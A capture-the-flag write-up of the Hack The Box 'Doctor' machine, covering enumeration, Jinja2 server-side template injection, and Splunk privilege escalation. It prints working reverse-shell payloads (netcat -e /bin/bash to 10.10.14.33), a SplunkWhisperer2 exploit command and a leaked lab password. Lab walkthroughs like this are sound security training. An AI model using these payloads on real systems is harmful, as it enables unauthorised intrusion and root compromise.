---
description: SSTI vuln
---

# Doctor

> Concept Learnt:

1. Enumeration
2. SSTI i.e Server Side Template Injection
3. Reverse shell
4. Privilege Escalation using Splunk

> Port Scanning

Scanning with the nmap to find the open ports and the services

Command used: _nmap -A -T4 doctors.htb_

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*MMSlDT2k3tsF314QaT_WoQ.png" alt="" height="322" width="700"><figcaption></figcaption></figure>

We can observe that Splunk , HTTP and SSH ports are open. Starting with web recon

So we can observe that there is a login page in the application or we could use dirbuster/dirb or gobuster to enumerate all the pages in the web app

<figure><img src="https://miro.medium.com/v2/resize:fit:700/0*X-HpvgOiTviqHFcU.png" alt="" height="222" width="700"><figcaption><p>gobuster scan</p></figcaption></figure>

So we have the login portal now , tried SQLi but no luck.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/0*g6TLQ-fzi4u6vbfG.png" alt="" height="443" width="700"><figcaption></figcaption></figure>

So we have no option left than signing up in the portal.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/0*4CY2nmT0cqeZ5WwL.png" alt="" height="282" width="700"><figcaption></figcaption></figure>

Now while enumerating I observed that whatever the message in Title field will be , reflected in URI /archive (page source )found in the directory scan.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*sAiNYJ7O7icf3T5mFfPi5g.png" alt="" height="434" width="700"><figcaption></figcaption></figure>

Since it is reflecting the values we could try various attacks like XSS, SSTI etc

No luck with the XSS , trying with the SSTI.

We have various methods to find that the field is vulnerable to SSTI or not. Personally I follow this image to find the specific template used in application as well is it vulnerable to it or not??

<figure><img src="https://miro.medium.com/v2/resize:fit:700/0*4vv-xaA1wUTZkXpE.png" alt="" height="423" width="700"><figcaption></figcaption></figure>

Enter in the title field {7\*7} → \{{7\*7\}} → \{{7\*’7'\}} → Result 55555. This shows that the template used in the application is Jinja2 or Twig

For detailed info on SSTI (Server Side Template Injection) visit:

> Gaining reverse shell:

Now as we have enough information about the template. We could use that info for creating reverse payload. There are plethora of payloads available on the internet for reverse shell. The easiest payload which I encountered is

_\<img src=http://10.10.14.33/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.14.33'$IFS'1234')>_

Here we are calling netcat & $IFS in the code means whitespace. Thus our simplified code (for understanding purpose) is:

\<img src=http://IPaddressofmachine/$(nc -e /bin/bash ‘10.10.14.33’ ‘1234’)

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*RBkHDcHgweOA7jXj3nK_vA.png" alt="" height="403" width="700"><figcaption></figcaption></figure>

Or we could use the payload mentioned [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#methodology)!!

Make sure there is listener already being active before executing this command. Here in the case **nc -nlvp 1234**. Since we have used port 1234 in malicious code.

Boom we got the reverse shell!!!

<figure><img src="https://miro.medium.com/v2/resize:fit:429/1*XLJ0zhoV_N59MzCSYKRYJQ.png" alt="" height="85" width="429"><figcaption></figcaption></figure>

We got the www (web) account of the machine. Getting interactive shell using python module (pty):

_python3 -c ‘import pty; pty.spawn(“/bin/bash”)’_

Now by exploring the system we could know the user account present is **shaun**. Enumerating groups of the accounts to find more info

<figure><img src="https://miro.medium.com/v2/resize:fit:466/0*GYGkyyyZc437Ig8d.png" alt="" height="192" width="466"><figcaption></figcaption></figure>

We could find **web adm** group which is used for viewing log files i.e /var/log

Now looking for logs of apache2 in the system and hope to find something useful!

<figure><img src="https://miro.medium.com/v2/resize:fit:700/0*od_I7djF_iYeDQot.png" alt="" height="620" width="700"><figcaption></figcaption></figure>

Boom …we found a backup file..Digging into the backup file and we could find the password i.e Guitar123 (by grep keyword “password” in the file)

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*zv279JAyJ8ndp2gv9mbqSA.png" alt="" height="27" width="700"><figcaption></figcaption></figure>

> Privilege Escalation

Logging using useraccount and password i.e su shaun and password Guitar123.

Here we could finish our first checkpoint i.e user flag in home folder.

Yet this account also does not have sudo rights (sudo -l). Thus finding binary vulnerability using [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS). No luck

Now, googling about the exploitation of SPLUNK HTTPD (Privilege Escalation) and found a exploit:

[cnotin/SplunkWhisperer2Local privilege escalation, or remote code execution, through Splunk Universal Forwarder (UF) misconfigurations. See…github.com](https://github.com/cnotin/SplunkWhisperer2?source=post\_page-----b0604e07b778--------------------------------)

Exploiting the Splunk using parameters required as mentioned in the readme file of Splunk

_python3 PySplunkWhisperer2\_remote.py — host 10.10.10.209 — lhost 10.10.14.33 — username shaun — password Guitar123 — payload ‘nc.traditional -e/bin/sh ‘10.10.14.33’ ‘1233’’_

Here 10.10.14.33 is the host IP(Doctor’s) address and 10.10.14.33 is our IP address. Thus using netcat trying to get reverse shell

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*LaJtYI01XIr2XgA_YyhNEA.png" alt="" height="147" width="700"><figcaption></figcaption></figure>

Make sure the netcat listener is active on the port which we have mentioned in the parameter of SPLUNK, here in our case “1233"

<figure><img src="https://miro.medium.com/v2/resize:fit:515/1*HgbgOwce3AQwJCsUoQTLHw.png" alt="" height="113" width="515"><figcaption></figcaption></figure>

Boom we got the root access!!!
